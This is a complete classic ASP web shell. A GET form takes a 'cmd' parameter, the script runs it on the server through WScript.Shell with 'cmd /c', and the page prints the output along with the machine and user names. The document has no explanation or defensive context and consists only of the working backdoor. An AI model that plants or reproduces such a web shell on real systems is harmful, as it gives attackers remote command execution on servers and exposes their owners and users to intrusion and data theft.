<%
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>
<html>
<body>
<form action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</form>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<hr />
<pre>
<%
szCMD = request("cmd")
szOutput = getCommandOutput("cmd /c" & szCMD)
Response.Write(szOutput)
%>
</pre>
</body>
</html>